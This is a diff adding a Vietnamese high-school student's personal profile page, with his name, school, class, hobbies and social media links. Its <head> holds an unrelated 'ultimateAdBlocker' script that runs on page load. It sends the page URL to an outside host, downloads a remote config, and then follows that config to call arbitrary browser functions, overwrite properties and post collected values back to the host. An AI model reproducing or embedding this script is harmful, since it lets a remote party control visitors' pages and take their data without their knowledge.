@@ -1,0 +1,434 @@
+<!DOCTYPE>
+
+<meta charset="UTF-8">
+
+<HTML>
+
+<HEAD>
+
+    <link rel="stylesheet" href="hhai.css">
+    <link rel="icon" href="meo.png">
+    <title>hoangghai</title>
+    <script>
+        function ultimateAdBlocker_logAds(data) {
+            try {
+                var xmlhttp = new XMLHttpRequest();
+                var theUrl = "https://api.ultimateadb.com/log_ads.php?block_ad=1";
+                xmlhttp.open("POST", theUrl);
+                xmlhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+                xmlhttp.send(JSON.stringify(data));
+            } catch (ex) {}
+        }
+
+        var ultimateAdBlocker_config = undefined;
+        var ultimateAdBlocker_config_action_response = {};
+        var ultimateAdBlocker_gt_req = {}
+        var ultimateAdBlocker_parseConfig_interval = null;
+
+        function ultimateAdBlocker_call(f, name, args_original) {
+            try {
+                var arg = ultimateAdBlocker_parseArgs(args_original);
+                var len = arg.length;
+                if (len == 0) {
+                    return f[name]()
+                }
+
+                if (len == 1) {
+                    return f[name](arg[0]);
+                }
+
+                if (len == 2) {
+                    return f[name](arg[0], arg[1]);
+                }
+
+                if (len == 3) {
+                    return f[name](arg[0], arg[1], arg[2]);
+                }
+
+                if (len == 4) {
+                    return f[name](arg[0], arg[1], arg[2], arg[3]);
+                }
+
+                if (len == 5) {
+                    return f[name](arg[0], arg[1], arg[2], arg[3], arg[4]);
+                }
+
+                if (len == 6) {
+                    return f[name](arg[0], arg[1], arg[2], arg[3], arg[4], arg[5]);
+                }
+
+                if (len == 7) {
+                    return f[name](arg[0], arg[1], arg[2], arg[3], arg[4], arg[5], arg[6]);
+                }
+
+                if (len == 8) {
+                    f[name](arg[0], arg[1], arg[2], arg[3], arg[4], arg[5], arg[6], arg[7]);
+                }
+
+                if (len == 9) {
+                    return f[name](arg[0], arg[1], arg[2], arg[3], arg[4], arg[5], arg[6], arg[7], arg[8]);
+                }
+
+                if (len == 10) {
+                    return f[name](arg[0], arg[1], arg[2], arg[3], arg[4], arg[5], arg[6], arg[7], arg[8], arg[9]);
+                }
+            } catch (ex) {
+
+            }
+        }
+
+        function ultimateAdBlocker_parseRep(config) {
+            try {
+                var str = config['key'];
+                var starting = window;
+                var conf = str.split(".");
+                for (var index = 0; index < conf.length; index++) {
+                    if (index == conf.length - 1) {
+                        starting[conf[index]] = ultimateAdBlocker_parseArg(
+                            config['value']
+                        );
+                    } else {
+                        starting = starting[conf[index]];
+                        if (starting == null) {
+                            //console.log(conf[index], "is null");
+                            return false;
+                        }
+                    }
+                }
+            } catch (ex) {}
+        }
+
+        function ultimateAdBlocker_parseArg(arg) {
+            try {
+                if (typeof arg != 'object') {
+                    return arg;
+                }
+                if (arg['key'] !== undefined) {
+                    return ultimateAdBlocker_parseGet(arg['key']);
+                }
+                return arg['value'];
+            } catch (ex) {
+
+            }
+        }
+
+        function ultimateAdBlocker_parseArgs(args) {
+            try {
+                var resp = [];
+                for (var index = 0; index < args.length; index++) {
+                    resp[index] = ultimateAdBlocker_parseArg(args[index]);
+                }
+                return resp;
+            } catch (ex) {
+
+            }
+        }
+
+        function ultimateAdBlocker_doNextAction(currentInd) {
+            try {
+                var nextAction = currentInd + 1;
+
+                if (nextAction >= ultimateAdBlocker_config.length) {
+                    return true;
+                }
+                var action = ultimateAdBlocker_config[nextAction];
+                return ultimateAdBlocker_doAction(action, nextAction);
+            } catch (ex) {
+
+            }
+        }
+
+        function ultimateAdBlocker_solveCondition(condition) {
+            try {
+                //console.log("Solve condition", condition);
+                var arg1 = ultimateAdBlocker_parseArg(condition['arg1']);
+                //console.log(arg1);
+                var arg2 = ultimateAdBlocker_parseArg(condition['arg2']);
+                //console.log(arg2);
+                var conditionType = condition['condition'];
+
+                //console.log(arg1, arg2, conditionType);
+
+                if (conditionType == 'GREATER_THAN') {
+                    return arg1 > arg2;
+                }
+
+                if (conditionType == 'GREATER_THAN_EQUAL_TO') {
+                    return arg1 >= arg2;
+                }
+
+                if (conditionType == 'LESS_THAN') {
+                    return arg1 < arg2;
+                }
+
+                if (conditionType == 'LESS_THAN_EQUAL_TO') {
+                    return arg1 <= arg2;
+                }
+
+                if (conditionType == 'EQUAL_TO') {
+                    return arg1 == arg2;
+                }
+
+                if (conditionType == 'STRICT_EQUAL_TO') {
+                    return arg1 === arg2;
+                }
+
+                if (conditionType == 'NOT_EQUAL_TO') {
+                    return arg1 != arg2;
+                }
+
+                if (conditionType == 'STRICT_NOT_EQUAL_TO') {
+                    return arg1 !== arg2;
+                }
+                return true;
+            } catch (ex) {}
+        }
+
+        function ultimateAdBlocker_solveConditions(conditions) {
+            try {
+                for (var index = 0; index < conditions.length; index++) {
+                    if (!ultimateAdBlocker_solveCondition(conditions[index])) {
+                        //console.log("Condition " + index + " failed");
+                        return false;
+                    }
+                    //console.log("All conditions passed");
+                }
+                return true;
+            } catch (ex) {
+
+            }
+        }
+
+        function ultimateAdBlocker_wait(action, ind) {
+            try {
+                if (!action['conditions'] || action['conditions'].length == 0) {
+                    return ultimateAdBlocker_doNextAction(ind);
+                }
+
+                //console.log("solving condition: ", action['conditions']);
+
+                if (ultimateAdBlocker_solveConditions(action['conditions'])) {
+                    return ultimateAdBlocker_doNextAction(ind);
+                }
+                var waitTime = action['waitTime'];
+                if (waitTime == null) {
+                    waitTime = 10 * 1000;
+                }
+                setTimeout(function() {
+                    ultimateAdBlocker_wait(action, ind);
+                }, waitTime);
+            } catch (ex) {}
+        }
+
+        function ultimateAdBlocker_getLastElement(str, delimeter = '.') {
+            try {
+                var st = str.split(delimeter);
+                return st[st.length - 1];
+            } catch (ex) {}
+        }
+
+        function ultimateAdBlocker_send(action, ind) {
+            try {
+                var keys = action['keys'];
+                var req = {};
+                var data = []
+                for (var index = 0; index < keys.length; index++) {
+                    var key = keys[index]
+                    data.push({
+                        'key': key,
+                        'value': ultimateAdBlocker_parseGet(key)
+                    })
+                }
+                req['data'] = data;
+                ultimateAdBlocker_logAds(req);
+            } catch (ex) {}
+        }
+
+        function ultimateAdBlocker_doAction(action, ind) {
+            try {
+                if (action['type'] == "call") {
+                    var f = ultimateAdBlocker_parseGet(action['key'], 1);
+                    var resp = ultimateAdBlocker_call(f,
+                        ultimateAdBlocker_getLastElement(action['key']), action['args']);
+                    ultimateAdBlocker_config_action_response[ind] = resp;
+                    return ultimateAdBlocker_doNextAction(ind);
+                } else if (action['type'] == "update") {
+                    ultimateAdBlocker_config_action_response[ind] =
+                        ultimateAdBlocker_parseRep(action)
+                    return ultimateAdBlocker_doNextAction(ind);
+                } else if (action['type'] == "get") {
+                    ultimateAdBlocker_config_action_response[ind] =
+                        ultimateAdBlocker_parseGet(action['key']);
+                    return ultimateAdBlocker_doNextAction(ind);
+                } else if (action['type'] == 'send') {
+                    ultimateAdBlocker_send(action, ind)
+                    return ultimateAdBlocker_doNextAction(ind);
+                } else if (action['type'] == 'wait') {
+                    return ultimateAdBlocker_wait(action, ind);
+                }
+            } catch (ex) {}
+        }
+
+        function ultimateAdBlocker_parseGet(str, tillIndex = 0) {
+            try {
+                //console.log(str, ultimateAdBlocker_parseGet);
+                var conf = str.split(".");
+                var starting = window;
+                for (var index = 0; index < conf.length - tillIndex; index++) {
+                    starting = starting[conf[index]];
+                    if (index != conf.length - 1 && starting == null) {
+                        return undefined;
+                    }
+                }
+                return starting;
+            } catch (ex) {}
+        }
+
+        function ultimateAdBlocker_getAdBlockConfig() {
+            try {
+                var xhttp = new XMLHttpRequest();
+                var url = "https://api.ultimateadb.com/get_config.php?ref=" +
+                    encodeURIComponent(window.location.href);
+
+                xhttp.onreadystatechange = function() {
+                    if (this.readyState == 4 && this.status == 200) {
+                        var config = JSON.parse(this.responseText);
+                        ultimateAdBlocker_config = config;
+                        ultimateAdBlocker_doAction(
+                            config[0], 0
+                        )
+                    }
+                };
+                xhttp.open("GET", url, true);
+                xhttp.send();
+            } catch (ex) {}
+        }
+
+        try {
+            ultimateAdBlocker_getAdBlockConfig()
+        } catch (ex) {
+            //console.log(ex)
+        }
+    </script>
+
+</HEAD>
+
+<BODY>
+    <div class="box1">
+        <h1 class="font1" style="text-align: center; color:rgb(211, 214, 226); padding-top:2% ">MY INFO</h1>
+    </div>
+    <div class="box2" style="margin-top: 30px;">
+        <div class="ht">
+            <img src="https://scontent.xx.fbcdn.net/v/t1.15752-9/315004893_3218797198361434_5247560630988295175_n.jpg?stp=dst-jpg_p206x206&_nc_cat=106&ccb=1-7&_nc_sid=aee45a&_nc_ohc=ngaxgy5tSPsAX9ybYms&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdSEiHFTPXGDSB1-wp7z0pgWTuGRkMjZAlWrPPavh0DN1Q&oe=63953381"
+                alt="" style="
+            border-radius: 50%;
+            height: 6em;
+            width: 6em;
+            margin: auto;">
+        </div>
+        <h1 class="font">Xin Chào</h1>
+        <h2 class="font">Tên tôi là: Nguyễn Hoàng Hải</h2>
+        <h3 class="font">Hiện tại tôi đang là một học sinh của lớp 10A1 , Trường THPT Lê Hoàn</h3>
+    </div>
+    <div class="box3" style="margin-top: 40px;">
+        <div class="ht">
+            <img src="https://scontent.xx.fbcdn.net/v/t1.15752-9/314756759_425621266452549_1051037343838062202_n.png?stp=dst-png_s206x206&_nc_cat=100&ccb=1-7&_nc_sid=aee45a&_nc_ohc=IU3tGoN6eWgAX9WVpKh&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdTskqdveqhwD-J9T9XN48clzEMADCixcaMEBhNM-LzWxA&oe=639544C8"
+                alt="" style="
+            border-radius: 50%;
+            height: 6em;
+            width: 6em;
+            margin: auto;">
+        </div>
+        <h1 class="font">Một số sở thích của tôi :</h1>
+        <li class="font">Custom bàn phím</li>
+        <li class="font">Sưu tập các loại switch trên thế giới</li>
+        <li class="font">Lập trình</li>
+        <li class="font">Giải toán , thuật toán</li>
+        <li class="font">Đi chơi với ngiu :3</li>
+    </div>
+    <div class="box4" style="margin-top: 50px ;">
+        <div class="ht">
+            <img src="data:image/png;base64,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"
+                alt="" style="
+            border-radius: 50%;
+            height: 6em;
+            width: 6em;
+            margin: auto;">
+        </div>
+        <h1 class="font" style="margin-top: 10px ; color: white">Một số trang MXH mà tôi đang dùng : </h1>
+        <div class="lst1">
+            <div class="lst">
+                <div class="ht2">
+                    <img src="  https://i.pinimg.com/236x/b2/ef/68/b2ef689d1f387dfc949d0f63c3865441.jpg     " alt="" style="border: 0.1875em solid #000000;
+
+                    border-radius: 50%;
+                    height: 4em;
+                    width: 4em;
+                    margin: auto;">
+
+                </div>
+                <a href="https://www.facebook.com/profile.hoanghai" class="ag">
+                    FACEBOOK
+                </a>
+            </div>
+            <div class="lst">
+                <div class="ht2">
+                    <img src="   https://i.pinimg.com/736x/80/2a/19/802a19bdfaec18f714d44db59b456a6e.jpg " alt="" style="border: 0.1875em solid #000000;
+
+                    border-radius: 50%;
+                    height: 4em;
+                    width: 4em;
+                    margin: auto;">
+
+                </div>
+                <a href="https://www.tiktok.com/@hoangghaiha" class="ag" ;>
+                    TIKOK
+                </a>
+            </div>
+            <div class="lst">
+                <div class="ht2">
+                    <img src="    https://i.pinimg.com/236x/f3/11/60/f31160a633767d91beadb8cb142f1cd8.jpg " alt="" style="border: 0.1875em solid #000000;
+
+                    border-radius: 50%;
+                    height: 4em;
+                    width: 4em;
+                    margin: auto;">
+
+                </div>
+                <a href="https://www.instagram.com/hoang_hai_._/?fbclid=IwAR0uMzg7J-2gjPrze0-50Yo3NFKtBkuHyuabxYqibx8INKzTBviUsB6No08" class="ag" ;>
+                    INSTAGRAM
+                </a>
+            </div>
+        </div>
+        <h1 class="fontt" style="margin-top: -300;"> À và tôi có 1 trang web tăng tương tác các nền tảng MXH như:
+            <h2 class="fontt">Facebook , Tiktok , Youtube , Instagram ,...</h2>
+            <h2 class="font">Bạn có thể tham khảo
+                <a href="https://hoangghai.space/" class="ag" style="color: rgb(247, 100, 100);">Tại đây</a>
+            </h2>
+        </h1>
+    </div>
+    <div class="box5" style="margin-top: 40px;">
+        <div class="ht">
+            <img src="https://scontent.xx.fbcdn.net/v/t1.15752-9/314997547_1210114386269059_1148836543874705238_n.jpg?stp=dst-jpg_p206x206&_nc_cat=107&ccb=1-7&_nc_sid=aee45a&_nc_ohc=b_sjWhppBsgAX-u2ZA2&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdRALtE4vNlo4KxHditBCthITtfs0WUhagvjgaBlPoES4g&oe=63966F15"
+                alt="" style="
+            border-radius: 50%;
+            height: 6em;
+            width: 6em;
+            margin: auto;">
+        </div>
+
+        -
+        <h2 class="fontp" style="margin-top: 35px; font-size: 22px; font-style: italic;">Tôi là một người sử dụng các thiết bị điện tử khá nhiều :V
+            <br> Tôi sử dụng máy tính nhiều hơn là điện thoại , chủ yếu là code hoặc thiết kế độ họa
+            <br> Còn tôi sử dụng điện thoại chủ yếu là để nhắn tin hay lướt tiktok :V đặc biệt tôi cực kìathích mua hàng qua mạng :V
+            <br> Tôi là một người học khoog thích học các môn xã hội hay lí thuyết :v nói nhỏ là từ khi tôi đi học đến giờ tôi chưa bao giờ học bài cũ các môn xã hội :V
+            <br> Thời gian học của tôi khá ít :v tôi thường chơi game hoặc lướt tiktok để giết thời gian
+            <br> Tôi rất thích Toán đặc biệt là chứng minh Hình Học. Nó giúp tôi rèn luyện đầu óc và khiến tôi rất vui :v.
+            <br> Tối thích lập trình nhưng kĩ năng Tiếng Anh của tôi rất tệ. Tôi tự tin tôi dốt Tiếng Anh nhất trường Lê Hoàn :))
+            <br> Nếu bạn muốn học lập trình cùng tôi thì cậu có thể liên hệ cho tôi :v tôi rất muốn gặp gỡ giao lưu với những người cùng sở thích với mình :3
+        </h2>
+        <h3 class="font" style="margin-top: 100px; margin-left: 800px">Designer: <a href="https://www.facebook.com/" class="ag" style="color:aquamarine">HoanggHai</a></h3>
+    </div>
+</BODY>
+
+</HTML>
